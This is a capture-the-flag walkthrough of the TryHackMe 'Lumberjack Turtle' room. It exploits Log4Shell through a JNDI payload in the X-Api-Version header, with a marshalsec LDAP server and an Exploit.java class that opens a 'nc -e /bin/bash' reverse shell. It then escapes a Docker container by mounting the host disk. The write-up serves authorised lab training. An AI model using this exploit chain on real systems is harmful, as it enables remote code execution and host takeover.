---
author: "Shebu"
title: "Lumberjack Turtle: THM"
date: "2022-01-31"
tags: ["log4shell", "log4j", "docker escape", "CVE-2021-44228"]
cover:
    image: img/lumberjackturtle.png
    # can also paste direct link from external site
    # ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
    alt: "<alt text>"
    caption: "<text>"
    relative: false # To use relative path for cover image, used in hugo Page-bundles
---

**Lumberjack Turtle** is a medium difficulty box from Tryhackme which is entirely focused on **Log4j/Log4shell** a 0-day vulnerability that caused a havoc on the internet . The website is vulnerable to Log4j & so we're able to exploit it and get a shell on the box . We find a **.dockerenv** file in the / directory which indicates we are on a docker container. To obtain the root flag , we mount the **/dev/xvda1** disk partition since it contains the entire filesystem(/) to access all the files .

*[Image: header]*

|  **Room** 	| *[Image: Lumberjack Turtle]*                                          	|
|:--------------:	|----------------------------------------------------	|
|     **OS**     	| Linux                                              	|
| **Difficulty** 	| Medium                                             	|
|  **Room Link** 	| [https://tryhackme.com/room/lumberjackturtle](https://tryhackme.com/room/lumberjackturtle)               	|
|   **Creator**  	| [SilverStr](https://tryhackme.com/p/SilverStr) 	|

# Enumeration 
----------------------

## Portscan 

```bash
┌──(root💀kali)-[~/thm/Lumberjackturtle]
└─$ nmap -sCV lumberjackturtle.thm -oN lumberjack.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-28 04:56 EST
Nmap scan report for lumberjackturtle.thm (10.10.241.157)
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE     VERSION
22/tcp open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6a:a1:2d:13:6c:8f:3a:2d:e3:ed:84:f4:c7:bf:20:32 (RSA)
|   256 1d:ac:5b:d6:7c:0c:7b:5b:d4:fe:e8:fc:a1:6a:df:7a (ECDSA)
|_  256 13:ee:51:78:41:7e:3f:54:3b:9a:24:9b:06:e2:d5:14 (ED25519)
80/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.92 seconds
```

## Website: port 80

The homepage of the website has only this comment .It gives us a hint as `java` and also to bruteforce the directories.

*[Image: website1]*

## Directory bruteforcing

## /~logs

```bash
┌──(root💀kali)-[~/thm/Lumberjackturtle]
└─$ dirsearch -u http://lumberjackturtle.thm -w /usr/share/wordlists/dirb/common.txt 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30
Wordlist size: 4613

Output File: /home/shebu/.dirsearch/reports/lumberjackturtle.thm/_22-01-28_05-01-17.txt

Error Log: /home/shebu/.dirsearch/logs/errors-22-01-28_05-01-17.log

Target: http://lumberjackturtle.thm/

[05:01:17] Starting: 
[05:01:21] 200 -   29B  - /~logs
[05:01:34] 500 -   73B  - /error

Task Completed
```
Now lets visit `/~logs` directory .

*[Image: website2]*

Again it tells us to go deeper !

## /log4j

```bash
┌──(root💀kali)-[~/thm/Lumberjackturtle]
└─$ dirsearch -u http://lumberjackturtle.thm/~logs/ -w /usr/share/wordlists/dirb/common.txt 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/shebu/.dirsearch/reports/lumberjackturtle.thm/~logs_22-01-28_06-10-12.txt

Error Log: /home/shebu/.dirsearch/logs/errors-22-01-28_06-10-12.log

Target: http://lumberjackturtle.thm/~logs/

[06:10:12] Starting: 
[06:10:52] 200 -   47B  - /~logs/log4j

Task Completed
```
Seems like a dead end. The comment here tells us that its vulnerabele

# Shell as Docker root
-----------------------

## Testing for log4j

> The Log4shell (CVE-2021-44228) vulnerability affects how Log4j processes log messages. By sending specially crafted messages to a system that uses Log4j, a threat actor can cause the system to load external code, leading to an RCE.
>
> Attackers can take advantage of it by just inserting a line of code like ${jndi:ldap://[attacker_URL]} 

Intercept the request in burp and send it to repeater tab. Set up a netcat listener on your terminal to look for any incoming connections . 

First lets test for log4j on `User-Agent` header.

*[Image: burp1]*

We get a hint in response: `CVE-2021-44228 IN X-Api-Version` .

Testing it again but this time sending out payload in **X-Api-version** header.

*[Image: burp2]*

We dont get any response back which is a good sign .It means we've got a connection back in our netcat session.

```bash
┌──(root💀kali)-[~/thm/Lumberjackturtle]
└─$ sudo nc -lvnp 53
listening on [any] 53 ...
connect to [10.8.106.23] from (UNKNOWN) [10.10.197.211] 50810
0
 `�
```
## RCE using log4j

Now we need to get a shell to move further.

### Exploit 

 _This is how it works_ 

1. When we send the payload `${jndi:ldap://attackerserver:1389/Exploit}` - it reaches out to our LDAP server .
2. The LDAP server forwards the request to our secondary server asking for the resource located at `http://attackerserver:8000/Exploit` .
3. Secondary server serves the `Exploit.class` file.
4. After retreiving , `the victim_server executes the code present in Exploit.class` (which is basically a reverse shell)
5. Once it executes , we get a reverse shell back on our netcat .

I'll explain the steps one by one , just follow me along .

First things first we need `java version 8` on our machine in order to build the LDAP server .Create 4 terminal windows and follow the steps.
> Note : Change VICTIM-IP with your Machine_IP and ATTACKER-IP to your tun0 IP! 

### LDAP server (Terminal 1)

Steps: 

1. To exploit this issue, we need to have a malicious LDAP server. Marshalsec Utility can be used for this part .Git clone the repository.
LINK: [https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec) .
2. Run `sudo apt install maven` to install Java builder maven.
3. `cd marshalsec` (move into the cloned repository)
4. RUN: `mvn clean package -DskipTests` (build marshalsec utility)
5. RUN: `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “http://ATTACKER-IP:8000/#Exploit"`  (start LDAP referal server)

### Secondary HTTP server (Terminal 2)

This is used to serve the `Exploit.class` file when the victim server requests it.

Contents of `Exploit.java` file 👇🏻
```java
public class Exploit 
{ 
	static { 
		try { 
			java.lang.Runtime.getRuntime().exec("nc -e /bin/bash ATTACKER-IP 9999"); 
			}
	catch (Exception e) 
			{ 
			e.printStackTrace(); 
			} 
		   } 
}
```
Steps:

1. Create a file named `Exploit.java` with the following contents mentioned above 
2. RUN: `javac Exploit.java -source 8 -target 8` (compile the payload file) 
3. Now new file called `Exploit.class is created`.
4. RUN: `python3 -m http.server` (start a local server) 

### Netcat listener (Terminal 3)

This is used to catch the reverse shell after the victim_server retreives & executes our malicious **Exploit.class** file.

```
nc -lvnp 9999
```

### Trigger the exploit (Terminal 4)

```bash
curl -X GET  http://VICTIM-IP/~logs/log4j/ -H 'X-Api-Version: ${jndi:ldap://Attacker-IP:1389/Exploit\}'
```
And we get a shell back on our nc

```bash
┌──(root💀kali)-[~/thm/Lumberjackturtle]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.8.106.23] from (UNKNOWN) [10.10.244.37] 42387
whoami
root
```
## user.txt 🚩

So we are user root. Hmm Wierd !

## Docker_env

Listing all the files in the `/` directory we see a `.dockerenv `  which means we are in a `docker container` .

First lets grab the **user.txt flag* before escalating our privileges.
**user flag** was neither in the `/home` directory nor in the `/root` directory in the docker container. On further enumeration I found the `user flag` in `/opt` 

```
# cd /opt
/opt # ls -la
total 12
drwxr-xr-x    1 root     root          4096 Dec 11 21:04 .
drwxr-xr-x    1 root     root          4096 Dec 13 01:26 ..
-rw-r--r--    1 root     root            19 Dec 11 21:04 .flag1
/opt # cat .flag1
THM{LOG*****W}
```
# root.txt
---------------

## docker escape

Running `fdisk` command shows that the `/` filesytem of the machine is mounted in `/dev/xvda1` .

```
# fdisk -l
Disk /dev/xvda: 40 GiB, 42949672960 bytes, 83886080 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x3650a2cc

Device     Boot Start      End  Sectors Size Id Type
/dev/xvda1 *     2048 83886046 83883999  40G 83 Linux

Disk /dev/xvdh: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

Disk /dev/xvdf: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
```
Lets create a new directory called `realroot` in `/tmp` directory & mount the partition there.

```
# mkdir /tmp/realroot    
# mount /dev/xvda1 /tmp/realroot
# ls -al /tmp/realroot
total 100
drwxr-xr-x   22 root     root          4096 Jan 30 15:48 .
drwxrwxrwt    1 root     root          4096 Jan 30 16:32 ..
drwxr-xr-x    2 root     root          4096 Dec  8 16:04 bin
drwxr-xr-x    3 root     root          4096 Dec  8 16:03 boot
drwxr-xr-x    4 root     root          4096 Dec  8 16:03 dev
drwxr-xr-x   94 root     root          4096 Dec 13 02:21 etc
drwxr-xr-x    3 root     root          4096 Dec 13 01:25 home
lrwxrwxrwx    1 root     root            34 Dec  8 16:02 initrd.img -> boot/initrd.img-4.15.0-163-generic
lrwxrwxrwx    1 root     root            34 Dec  8 16:02 initrd.img.old -> boot/initrd.img-4.15.0-163-generic
drwxr-xr-x   20 root     root          4096 Dec 13 01:24 lib
drwxr-xr-x    2 root     root          4096 Dec  8 15:56 lib64
drwx------    2 root     root         16384 Dec  8 16:05 lost+found
drwxr-xr-x    2 root     root          4096 Dec  8 15:53 media
drwxr-xr-x    2 root     root          4096 Dec  8 15:53 mnt
drwxr-xr-x    3 root     root          4096 Dec 13 01:25 opt
drwxr-xr-x    2 root     root          4096 Apr 24  2018 proc
drwx------    4 root     root          4096 Dec 13 01:25 root
drwxr-xr-x    3 root     root          4096 Dec  8 16:04 run
drwxr-xr-x    2 root     root          4096 Dec 13 01:24 sbin
drwxr-xr-x    2 root     root          4096 Dec  8 15:53 srv
drwxr-xr-x    2 root     root          4096 Apr 24  2018 sys
drwxrwxrwt    8 root     root          4096 Jan 30 15:51 tmp
drwxr-xr-x   12 root     root          4096 Dec 13 01:25 usr
drwxr-xr-x   12 root     root          4096 Dec 13 01:24 var
lrwxrwxrwx    1 root     root            31 Dec  8 16:02 vmlinuz -> boot/vmlinuz-4.15.0-163-generic
lrwxrwxrwx    1 root     root            31 Dec  8 16:02 vmlinuz.old -> boot/vmlinuz-4.15.0-163-generic
```
## root.txt 🚩

Now it is little tricky here since the root.txt doesn't have the flag but has this comment.

```
/tmp/realroot/root # ls -al
total 28
drwx------    4 root     root          4096 Dec 13 01:25 .
drwxr-xr-x   22 root     root          4096 Jan 30 15:48 ..
drwxr-xr-x    2 root     root          4096 Dec 13 01:25 ...
-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
drwx------    2 root     root          4096 Dec 13 01:23 .ssh
-r--------    1 root     root            29 Dec 13 01:25 root.txt

/tmp/realroot/root # cat root.txt
Pffft. Come on. Look harder.
```
If you notice well , there is a `...` directory. So cd into the directory and grab the `root.txt` flag 🎉.

```
/tmp/realroot/root # cd ...

/tmp/realroot/root/... # ls -al
total 12
drwxr-xr-x    2 root     root          4096 Dec 13 01:25 .
drwx------    4 root     root          4096 Dec 13 01:25 ..
-r--------    1 root     root            26 Dec 13 01:25 ._fLaG2

/tmp/realroot/root/... # cat ._fLaG2
THM{C0NT4******W}
```
